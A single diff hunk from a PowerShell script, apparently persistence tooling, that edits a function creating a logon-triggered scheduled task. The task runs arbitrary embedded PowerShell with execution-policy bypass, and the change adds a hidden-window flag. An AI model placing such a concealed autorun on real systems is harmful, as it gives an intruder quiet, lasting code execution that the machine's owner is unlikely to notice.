@@ -107,7 +107,7 @@ function Invoke-TASKS {
             New-ScheduledTaskAction -Execute "Powershell.exe" -Argument "-ExecutionPolicy Bypass -NoProfile -C `"$powershellcode`""
         }
         else {
-            New-ScheduledTaskAction -Execute "Powershell.exe" -Argument "-ExecutionPolicy Bypass -NoProfile -C `"$powershellcode`""
+            New-ScheduledTaskAction -Execute "Powershell.exe" -Argument "-Win Hidden -ExecutionPolicy Bypass -NoProfile -C `"$powershellcode`""
         }
         $task_trigger = New-ScheduledTaskTrigger -AtLogOn
         $task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
